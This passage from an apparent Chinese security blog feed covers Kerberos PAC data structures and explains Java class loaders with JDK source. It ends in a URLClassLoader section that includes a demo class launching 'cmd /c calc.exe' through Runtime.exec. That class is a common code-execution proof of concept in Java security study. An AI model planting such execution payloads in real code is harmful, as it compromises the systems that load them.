ResourceGroupDomainSid;</span><br><span class="line">   ULONG ResourceGroupCount;</span><br><span class="line">   [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO, *PKERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure></li><li><p>0x00000006：服务器校验和；0x00000007：KDC（特权服务器）校验和。</p><ul><li><p>分别由server密码和KDC密码加密，是为了防止PAC内容被篡改。</p></li><li><p>存在签名的原因有两个。首先，存在带有服务器密钥的签名，以防止客户端生成自己的PAC并将其作为加密授权数据发送到KDC，以包含在票证中。其次，提供具有KDC密钥的签名，以防止不受信任的服务伪造带有无效PAC的票证。</p></li><li><p>两个都是PAC_SIGNATURE_DATA结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PAC_SIGNATURE_DATA</span> &#123;</span></span><br><span class="line">    ULONG SignatureType;<span class="comment">//4字节，必须为下表中的值之一</span></span><br><span class="line">    UCHAR Signature[ANYSIZE_ARRAY];<span class="comment">//包含校验和。签名的长度由SignatureType字段的值确定</span></span><br><span class="line">&#125; PAC_SIGNATURE_DATA, *PPAC_SIGNATURE_DATA;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">值</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">KERB_CHECKSUM_HMAC_MD5<br>0xFFFFFF76</td><td align="left">签名大小为 16 个字节。十进制值为 -138。</td></tr><tr><td align="left">HMAC_SHA1_96_AES128<br>0x0000000F</td><td align="left">签名大小为 12 个字节。十进制值为 15。</td></tr><tr><td align="left">HMAC_SHA1_96_AES256<br>0x00000010</td><td align="left">签名大小为 12 个字节。十进制值为 16。</td></tr></tbody></table></li></ul></li><li><p>0x0000000A：PAC_CLIENT_INFO，客户名称和票证信息，也是一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PAC_CLIENT_INFO</span> &#123;</span></span><br><span class="line">    FILETIME ClientId;<span class="comment">//小端格式的FILETIME结构，包含 Kerberos 初始票证授予票证 (TGT)身份验证时间</span></span><br><span class="line">    USHORT NameLength;<span class="comment">//用于指定Name 字段的长度</span></span><br><span class="line">    WCHAR Name[<span class="number">1</span>];<span class="comment">//包含客户帐户名称的小端格式的 16 位 Unicode 字符数组</span></span><br><span class="line">&#125; PAC_CLIENT_INFO, *PPAC_CLIENT_INFO;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;这个是鸽了好久好久的，一直没写，今天补一下。还有域委派的想写一直没写……&lt;/p&gt;
&lt;p&gt;关于详细的可以RFC文档：&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4120.html&quot;&gt;https:</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="内网" scheme="https://ghostasky.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Java-类加载器</title>
    <link href="https://ghostasky.github.io/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <id>https://ghostasky.github.io/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</id>
    <published>2022-04-19T16:00:00.000Z</published>
    <updated>2022-07-12T06:26:47.628Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="前言-流程"><a href="#前言-流程" class="headerlink" title="前言+流程"></a>前言+流程</h1><p>java语言依赖JVM，运行的时候，需要先编译成class文件，之后java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，ClassLoader会调用JVM的native方法来定义一个<code>java.lang.Class</code>实例。</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/JvmSpec7.png" alt="JVM"></p><p>类文件编译流程：</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/20210108150835-53436af4-5180-1.png" alt="img"></p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderLearn</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过jdk自带的javap命令反汇编查看class文件对应的<code>com.yutao.day1.ClassLoaderLearn</code>类，</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421161921106.png" alt="image-20220421161921106"></p><p>JVM在执行<code>ClassLoaderLearn</code>之前会先解析class的二进制内容，JVM执行的其实就是如上<code>javap</code>命令生成的字节码。</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421161945724.png" alt="image-20220421161945724"></p><h1 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h1><blockquote><p>  类加载阶段分为加载、连接、初始化三个阶段，而加载阶段需要通过类的全限定名来获取定义了此类的二进制字节流。<strong>Java特意把这一步抽出来用类加载器来实现</strong>。把这一步骤抽离出来使得应用程序可以按需自定义类加载器。并且得益于类加载器，OSGI、热部署等领域才得以在JAVA中得到应用。</p><p>  在Java中<strong>任意一个类都是由这个类本身和加载这个类的类加载器来确定这个类在JVM中的唯一性</strong>。也就是你用你A类加载器加载的<code>com.aa.ClassA</code>和你A类加载器加载的<code>com.aa.ClassA</code>它们是不同的，也就是用<code>instanceof</code>这种对比都是不同的。所以即使都来自于同一个class文件但是由不同类加载器加载的那就是两个独立的类。</p></blockquote><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/20210108151613-642298d0-5181-1.png" alt="img"></p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/sqqqqq.png" alt="双亲委派模型"></p><p>双亲委派的意思是如果一个类加载器需要加载类，那么首先它会把这个类请求委派给父类加载器去完成，每一层都是这样。一直到顶层后，父类的加载器也不能完成该请求时，子类才会尝试加载，。这里父类并不是继承关系，而是委派、逻辑的关系。</p><p>优点：</p><ul><li>能够实现有些类避免重复加载使用，直接先给父加载器加载，不用子加载器再次重复加载。</li><li>保证java核心库的类型安全。比如网络上传输了一个java.lang.Object类，通过双亲模式传递到启动类当中，然后发现其Object类早已被加载过，所以就不会加载这个网络传输过来的java.lang.Object类，保证我们的java核心API库不被篡改，出现类似用户自定义java.lang.Object类的情况。</li></ul><h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><p>类加载器大致分为两种，一种是JVM自带的类加载器，分别为<strong>引导类加载器</strong>、<strong>扩展类加载器</strong>和<strong>APP类加载器&#x2F;系统类加载器</strong>。另外一种就是用户<strong>自定义的类加载器</strong>，可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器。</p><p>所有java类必须经过jvm加载后才能运行，<code>ClassLoader</code>主要作用就是java类文件的加载，在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>。<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><h2 id="引导类加载器"><a href="#引导类加载器" class="headerlink" title="引导类加载器"></a>引导类加载器</h2><blockquote><p>  引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在&#x2F;jre&#x2F;lib&#x2F;rt.jar目录当中。(同时处于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类)。</p></blockquote><p>rt.jar里的类都是由<code>BootstrapClassLoader</code>来加载：</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421165137430.png" alt="image-20220421165137430"></p><p><code>BootstrapClassLoader</code>无父加载器 ：</p><p>object类是所有子类的父类，这里使用object：</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421165519027.png" alt="image-20220421165519027"></p><h2 id="扩展类加载器"><a href="#扩展类加载器" class="headerlink" title="扩展类加载器"></a>扩展类加载器</h2><blockquote><p>  扩展类加载器(ExtensionsClassLoader)，由sun.misc.Launcher$ExtClassLoader类实现，用来在&#x2F;jre&#x2F;lib&#x2F;ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。</p></blockquote><p>这里的jar包都由扩展类加载器进行加载：</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421170413392.png" alt="image-20220421170413392"></p><p>比如选择dnsns.jar：</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421171127650.png" alt="image-20220421171127650"></p><h2 id="APP类加载器-x2F-系统类加载器"><a href="#APP类加载器-x2F-系统类加载器" class="headerlink" title="APP类加载器&#x2F;系统类加载器"></a>APP类加载器&#x2F;系统类加载器</h2><blockquote><p>  App类加载器&#x2F;系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它</p></blockquote><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421171428090.png" alt="image-20220421171428090"></p><h1 id="Java类动态加载方式"><a href="#Java类动态加载方式" class="headerlink" title="Java类动态加载方式"></a>Java类动态加载方式</h1><p>java类加载分为显式和隐式</p><p>显式：通过java反射或者ClassLoader来动态加载一个类</p><p>隐式：<code>类名.方法名()</code>或者new 示例，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射加载</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.xxx.xx.xx..x.x.x.xx&quot;</span>);<span class="comment">//默认会初始化被加载类的静态属性和方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoader加载</span></span><br><span class="line"><span class="keyword">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;com.xxx.xx.xx..x.x.x.xx&quot;</span>);<span class="comment">//默认不会初始化</span></span><br></pre></td></tr></table></figure><h1 id="ClassLoader类核心方法"><a href="#ClassLoader类核心方法" class="headerlink" title="ClassLoader类核心方法"></a>ClassLoader类核心方法</h1><p>除了<code>BootstrapClassLoader</code>，其他类加载器都继承<code>ClassLoader</code>，下面是核心方法：</p><p><code>ClassLoader</code>类有如下核心方法：</p><ol><li><code>loadClass</code>（加载指定的Java类）</li><li><code>findClass</code>（查找指定的Java类）</li><li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li><li><code>defineClass</code>（定义一个Java类,将字节码解析成虚拟机识别的Class对象）</li><li><code>resolveClass</code>（链接指定的Java类）</li></ol><h2 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h2><p>加载指定的java类:</p><p>loadClass:</p><ol><li>首先使用<code>getClassLoadingLock()</code>检查这个类是否被加载过。</li><li>调用<code>findLoadedClass</code>检查是否已经初始化，如果JVM已经初始化过该类，返回类对象</li><li>如果创建当前<code>ClassLoader</code>时传入了父类加载器，就是用父类加载器加载，否则使用<code>Bootstrap ClassLoader</code>加载</li><li>如果上一步还未加载，调用<code>findClass</code>加载类。</li><li>如果当前<code>ClassLoader</code>没有重写<code>findClass</code>方法，返回异常</li><li>……..</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, Boolean resolve) <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line"><span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line"><span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c = findBootstrapClassOrNull(name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line"><span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line"><span class="comment">// from the non-null parent class loader</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line"><span class="comment">// to find the class.</span></span><br><span class="line"><span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">c = findClass(name);</span><br><span class="line"><span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">resolveClass(c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="findClass"><a href="#findClass" class="headerlink" title="findClass"></a>findClass</h2><p>查找指定的Java类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Finds the class with the specified &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt;.</span></span><br><span class="line"><span class="comment"> * This method should be overridden by class loader implementations that</span></span><br><span class="line"><span class="comment"> * follow the delegation model for loading classes, and will be invoked by</span></span><br><span class="line"><span class="comment"> * the &#123;<span class="doctag">@link</span> #loadClass &lt;tt&gt;loadClass&lt;/tt&gt;&#125; method after checking the</span></span><br><span class="line"><span class="comment"> * parent class loader for the requested class.  The default implementation</span></span><br><span class="line"><span class="comment"> * throws a &lt;tt&gt;ClassNotFoundException&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  name</span></span><br><span class="line"><span class="comment"> *         The &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; of the class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The resulting &lt;tt&gt;Class&lt;/tt&gt; object</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  ClassNotFoundException</span></span><br><span class="line"><span class="comment"> *          If the class could not be found</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>  1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="findLoadedClass"><a href="#findLoadedClass" class="headerlink" title="findLoadedClass"></a>findLoadedClass</h2><p>查找JVM已经加载过的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the class with the given &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; if this</span></span><br><span class="line"><span class="comment"> * loader has been recorded by the Java virtual machine as an initiating</span></span><br><span class="line"><span class="comment"> * loader of a class with that &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt;.  Otherwise</span></span><br><span class="line"><span class="comment"> * &lt;tt&gt;null&lt;/tt&gt; is returned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  name</span></span><br><span class="line"><span class="comment"> *         The &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; of the class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The &lt;tt&gt;Class&lt;/tt&gt; object, or &lt;tt&gt;null&lt;/tt&gt; if the class has</span></span><br><span class="line"><span class="comment"> *          not been loaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>  1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!checkName(name))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> findLoadedClass0(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h2><p>定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Converts an array of bytes into an instance of class &lt;tt&gt;Class&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> * Before the &lt;tt&gt;Class&lt;/tt&gt; can be used it must be resolved.  This method</span></span><br><span class="line"><span class="comment"> * is deprecated in favor of the version that takes a &lt;a</span></span><br><span class="line"><span class="comment"> * href=&quot;#name&quot;&gt;binary name&lt;/a&gt; as its first argument, and is more secure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  b</span></span><br><span class="line"><span class="comment"> *         The bytes that make up the class data.  The bytes in positions</span></span><br><span class="line"><span class="comment"> *         &lt;tt&gt;off&lt;/tt&gt; through &lt;tt&gt;off+len-1&lt;/tt&gt; should have the format</span></span><br><span class="line"><span class="comment"> *         of a valid class file as defined by</span></span><br><span class="line"><span class="comment"> *         &lt;cite&gt;The Java&amp;trade; Virtual Machine Specification&lt;/cite&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  off</span></span><br><span class="line"><span class="comment"> *         The start offset in &lt;tt&gt;b&lt;/tt&gt; of the class data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  len</span></span><br><span class="line"><span class="comment"> *         The length of the class data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The &lt;tt&gt;Class&lt;/tt&gt; object that was created from the specified</span></span><br><span class="line"><span class="comment"> *          class data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  ClassFormatError</span></span><br><span class="line"><span class="comment"> *          If the data did not contain a valid class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  IndexOutOfBoundsException</span></span><br><span class="line"><span class="comment"> *          If either &lt;tt&gt;off&lt;/tt&gt; or &lt;tt&gt;len&lt;/tt&gt; is negative, or if</span></span><br><span class="line"><span class="comment"> *          &lt;tt&gt;off+len&lt;/tt&gt; is greater than &lt;tt&gt;b.length&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  SecurityException</span></span><br><span class="line"><span class="comment"> *          If an attempt is made to add this class to a package that</span></span><br><span class="line"><span class="comment"> *          contains classes that were signed by a different set of</span></span><br><span class="line"><span class="comment"> *          certificates than this class, or if an attempt is made</span></span><br><span class="line"><span class="comment"> *          to define a class in a package with a fully-qualified name</span></span><br><span class="line"><span class="comment"> *          that starts with &quot;&#123;<span class="doctag">@code</span> java.&#125;&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>  #loadClass(String, boolean)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>  #resolveClass(Class)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@deprecated</span>  Replaced by &#123;<span class="doctag">@link</span> #defineClass(String, byte[], int, int)</span></span><br><span class="line"><span class="comment"> * defineClass(String, byte[], int, int)&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h2><p>链接指定java类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Links the specified class.  This (misleadingly named) method may be</span></span><br><span class="line"><span class="comment"> * used by a class loader to link a class.  If the class &lt;tt&gt;c&lt;/tt&gt; has</span></span><br><span class="line"><span class="comment"> * already been linked, then this method simply returns. Otherwise, the</span></span><br><span class="line"><span class="comment"> * class is linked as described in the &quot;Execution&quot; chapter of</span></span><br><span class="line"><span class="comment"> * &lt;cite&gt;The Java&amp;trade; Language Specification&lt;/cite&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  c</span></span><br><span class="line"><span class="comment"> *         The class to link</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  NullPointerException</span></span><br><span class="line"><span class="comment"> *          If &lt;tt&gt;c&lt;/tt&gt; is &lt;tt&gt;null&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>  #defineClass(String, byte[], int, int)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">    resolveClass0(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="用户自定义ClassLoader"><a href="#用户自定义ClassLoader" class="headerlink" title="用户自定义ClassLoader"></a>用户自定义ClassLoader</h1><p>实际使用中，不仅仅希望使用classpath中的类或者jar包，还可能希望使用本地磁盘或者网上的，这时候就用到了自定义类加载的方式。</p><p>上面的loadclass中，调用的是findClass(String)方法，所以加载自定义类的话重写的是findClass而不是loadClass</p><p>步骤：</p><ol><li>继承ClassLoader</li><li>重写findClass()</li><li>在findClass中调用defineClass方法</li></ol><h1 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h1><p>继承自ClassLoader，可以加载本地磁盘和网络中的jar包类文件。</p><p>本地class文件调用：</p><p>先写个java，内容是弹计算器，和sout</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">execcalc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">execcalc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Test success!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;cmd /c calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//E:\github\JavaSecLearn\Code\JavaSecLearn\src\com\yutao\day1</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 